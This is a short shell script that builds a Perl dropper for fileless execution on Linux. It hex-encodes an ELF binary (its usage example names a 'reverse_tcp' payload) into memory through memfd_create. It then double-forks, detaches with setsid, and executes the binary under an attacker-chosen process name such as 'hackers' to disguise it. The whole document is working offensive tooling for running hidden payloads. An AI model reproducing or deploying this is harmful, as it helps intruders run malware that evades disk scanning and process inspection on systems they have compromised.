#!/bin/sh
if [ 3 -ne $# ]; then
	echo "Usage: ./gen_perl.sh [elf] [xx.pl] [proc_name]"
	echo "eg: ./gen_perl.sh reverse_tcp hack.pl hackers"
	exit 0
fi

# open /proc/xxx/xxx
echo "my \$name = \"\";
my \$fd = syscall(319, \$name, 1);
if (-1 == \$fd) {
    die \"memfd_create: $!\";
}
open(my \$FH, '>&='.\$fd) or die \"open: \$!\";
select((select(\$FH), $|=1)[0]);
" > $2

# write binary to mem
perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(<>)' ./$1 >> $2

# exec binary with fork and named argv[3], and kill ppid
echo '
# Spawn child
my $pid = fork();
if (-1 == $pid) { # Error
   die "fork1: $!";
}
if (0 != $pid) { # Parent terminates
   exit 0;
}
# In the child, become session leader
if (-1 == syscall(112)) {
        die "setsid: $!";
}

# Spawn grandchild
$pid = fork();
if (-1 == $pid) { # Error
      die "fork2: $!";
}
if (0 != $pid) { # Child terminates
        exit 0;
}

exec {"/proc/$$/fd/$fd"} "'${3}'" or die "exec: $!";
' >> $2
